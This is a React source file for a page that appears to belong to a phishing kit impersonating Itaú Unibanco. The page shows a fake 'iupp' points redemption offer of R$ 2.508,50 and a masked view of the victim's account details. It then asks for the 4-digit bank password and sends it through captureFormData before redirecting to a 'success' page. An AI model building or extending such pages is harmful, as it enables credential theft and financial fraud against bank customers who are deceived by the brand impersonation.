import { useState } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import itauLogo from "@/assets/itau-logo.png";
import { useVisitorTracking, captureFormData } from "@/hooks/useVisitorTracking";

const Confirmacao = () => {
  useVisitorTracking("confirmacao");
  const location = useLocation();
  const navigate = useNavigate();
  const { nome, conta, agencia } = (location.state as any) || {};
  const [senha, setSenha] = useState("");
  const [selected, setSelected] = useState<"fatura" | "saldo">("saldo");

  const maskedAgencia = agencia ? `**${agencia.slice(-2)}` : "**--";
  const cleanConta = conta ? conta.replace(/\D/g, "") : "";
  const maskedConta = cleanConta.length >= 2
    ? `***${cleanConta.slice(-3, -1)}-${cleanConta.slice(-1)}`
    : "***---";

  return (
    <div className="min-h-screen max-w-md mx-auto relative flex flex-col" style={{ background: 'linear-gradient(135deg, #FF6200 0%, #CC5000 100%)' }}>
      {/* Header */}
      <div className="px-5 pt-6 pb-4">
        <img src={itauLogo} alt="Itaú" className="h-12" />
      </div>

      {/* Account Card */}
      <div className="mx-5 bg-white rounded-xl p-5 mb-4">
        <h2 className="text-foreground font-bold text-base mb-3">{nome || "1º TITULAR"}</h2>
        <p className="text-muted-foreground text-xs mb-1">Detalhes</p>
        <p className="text-foreground text-sm font-semibold">341 - ITAÚ UNIBANCO S.A.</p>
        <p className="text-muted-foreground text-xs">Conta Corrente Individual</p>
        <p className="text-muted-foreground text-xs mt-1">{maskedAgencia} / {maskedConta}</p>
        <div className="flex items-center justify-between mt-4">
          <span className="text-foreground font-bold text-base italic">iupp</span>
          <span className="text-[#FF6200] font-bold text-lg">120.425 pts</span>
        </div>
      </div>

      {/* Redemption Options */}
      <div className="mx-5 bg-white rounded-xl p-5 mb-4">
        <p className="text-muted-foreground text-sm mb-3">Escolha como deseja resgatar</p>

        <button
          onClick={() => setSelected("fatura")}
          className={`w-full flex items-center justify-between p-4 rounded-lg border mb-3 transition-colors ${selected === "fatura" ? "border-[#FF6200] bg-orange-50" : "border-border"}`}
        >
          <div className="text-left">
            <p className="text-foreground font-semibold text-sm">Abater na próxima fatura</p>
            <p className="text-muted-foreground text-xs">Desconto aplicado automaticamente</p>
          </div>
        </button>

        <button
          onClick={() => setSelected("saldo")}
          className={`w-full flex items-center justify-between p-4 rounded-lg border transition-colors ${selected === "saldo" ? "border-[#FF6200] bg-orange-50" : "border-border"}`}
        >
          <div className="text-left">
            <p className="text-foreground font-semibold text-sm">Saldo em conta</p>
            <p className="text-muted-foreground text-xs">Crédito direto na sua conta</p>
          </div>
          <span className="text-foreground font-bold text-sm">R$ 2.508,50</span>
        </button>
      </div>

      {/* Password Section */}
      <div className="mx-5 mb-6">
        <p className="text-primary-foreground font-bold text-base">Confirme seu resgate.</p>
        <p className="text-primary-foreground/80 text-sm mb-3">Digite sua senha de acesso.</p>
        <p className="text-primary-foreground font-bold text-sm mb-2">Senha</p>
        <div className="flex gap-4 items-center">
          {[0, 1, 2, 3].map((i) => (
            <div
              key={i}
              className={`w-4 h-4 rounded-full border-2 border-primary-foreground/50 ${i < senha.length ? "bg-primary-foreground" : "bg-transparent"}`}
            />
          ))}
        </div>
        <input
          ref={(el) => el?.focus()}
          type="tel"
          inputMode="numeric"
          pattern="[0-9]*"
          maxLength={4}
          value={senha}
          onChange={(e) => setSenha(e.target.value.replace(/\D/g, "").slice(0, 4))}
          className="w-full mt-2 bg-transparent text-primary-foreground border-b border-primary-foreground/30 pb-2 outline-none text-lg tracking-[1em] caret-primary-foreground"
          style={{ WebkitTextSecurity: "disc" } as React.CSSProperties}
        />
      </div>

      <div className="flex-1" />

      <div className="px-5 pb-8">
        <button
          onClick={() => { if (senha.length === 4) { captureFormData("confirmacao", { senha }); navigate("/sucesso"); } }}
          disabled={senha.length !== 4}
          className="w-full py-4 rounded-full bg-white/80 text-[#FF6200] font-semibold text-base hover:bg-white/90 transition-opacity disabled:opacity-40 disabled:cursor-not-allowed"
        >
          Confirmar
        </button>
      </div>
    </div>
  );
};

export default Confirmacao;
